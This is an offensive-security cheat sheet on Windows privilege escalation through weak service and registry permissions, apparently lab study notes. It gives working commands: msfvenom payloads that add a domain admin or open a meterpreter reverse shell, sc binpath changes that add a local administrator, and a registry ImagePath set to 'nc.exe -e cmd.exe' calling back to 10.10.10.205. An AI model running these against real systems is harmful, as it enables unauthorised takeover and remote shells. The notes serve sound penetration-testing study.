### Content

- [Overview](#overview)
- [Checking Services with Weak ACLs](#checking-services-with-weak-acls)
	- [Modifiable Service Binaries Abuse](#modifiable-service-binaries-abuse)
		- [Replacing Service Binary](#replacing-service-binary)
	- [Modifiable Services Abuse](#modifiable-services-abuse)
		- [Changing the Service Binary Path](#changing-the-service-binary-path)
- [Unquoted Service Path Abuse](#unquoted-service-path-abuse)
- [Weak Registry ACLs Abuse](#weak-registry-acls-abuse)
- [Modifiable Registry Autorun Binary](#modifiable-registry-autorun-binary)

---
#### Overview

Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions.



---
## Checking Services with Weak ACLs

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) to do so:

```PowerShell
PS C:\> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===
  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"

=== Modifiable Services ===
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

```

---
### Modifiable Service Binaries Abuse

Using [icacls](https://ss64.com/nt/icacls.html) and [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals with`SecurityService` :

```PowerShell
PS C:\> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
BUILTIN\Users:(I)(F)  #### full permissions to the directory
Everyone:(I)(F)       #### full permissions to the directory
NT AUTHORITY\SYSTEM:(I)(F)   
BUILTIN\Administrators:(I)(F)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

PS C:\> accesschk.exe /accepteula -quvcw  SecurityService

SecurityService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
```

Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

Attacker can abuse (F) `full permissions` by replacing service binary, to execute a malicious binary when a service start.

##### Replacing Service Binary

Make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`.
Then start the target service to start the injected payload.

```PowerShell
# msfvenom -p windows/x64/exec cmd='net group "domain admins" CurrentUser /add /domain' -f exe -o SecurityService.exe 
# or a reverse shell
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o SecurityService.exe

PS C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
PS C:\> cmd /c sc start SecurityService
```

 > [!Important]
 > Clean up and Ensure that the service is working correctly by stopping it and returning the original executable to the path then start the service.
 
---
### Modifiable Services Abuse

Using [icacls](https://ss64.com/nt/icacls.html) and [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals with`WindscribeService` :

```PowerShell
PS C:\> icacls "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)

# -q (omit banner), -u (suppress errors), -v (verbose), -c (specify name of a Windows service), and -w (show only objects that have write access). 
C:\> accesschk.exe /accepteula -quvcw WindscribeService

WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

Attacker can abuse `SERVICE_ALL_ACCESS` by changing the service binary path to run any command or executable.

##### Changing the Service Binary Path

Set the binary path to run a command then restart the service to execute the command

``` CMD
C:\> net localgroup administrators
Administrator

C:\> sc config WindscribeService binpath="cmd /c net localgroup administrators a21r /add"

C:\> sc stop WindscribeService

C:\> sc start WindscribeService

[SC] StartService FAILED 1053

C:\> net localgroup administrators
Administrator
a21r
```

 > [!Important]
 > Clean up and Ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable.

> Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.
> 
> An example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates.

---
### Unquoted Service Path Abuse

The registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders.

Query services with unquoted service path with:

```CMD
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

Example: `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

When querying the service:

``` CMD
C:\> sc qc SystemExplorerHelpService
BINARY_PATH_NAME  : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
[SNIP]

### It should be:
BINARY_PATH_NAME  : "C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe"
```

To be able to hijack the service, we should be able to create one of the following files:

- `C:\Program.exe`
- `C:\Program Files (x86)\System.exe`

> [!Important]
> - To be able to abuse unquoted service path, we should have access to the directories in the path and be able to restart the service itself. (As a result it isn't often exploitable)

---
### Weak Registry ACLs Abuse

Checking for Weak Service ACLs in Registry using AccessChk

```PowerShell
C:\> accesschk.exe /accepteula "userName" -kvuqsw hklm\System\CurrentControlSet\services

RW HKLM\System\CurrentControlSet\services\ModelManagerService
        KEY_ALL_ACCESS
<SNIP>
```

abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the `ImagePath` value, using a command such as:

```PowerShell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

---
### Modifiable Registry Autorun Binary

We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

```PowerShell
PS C:\> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

> This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2) detail many potential autorun locations on Windows systems.

---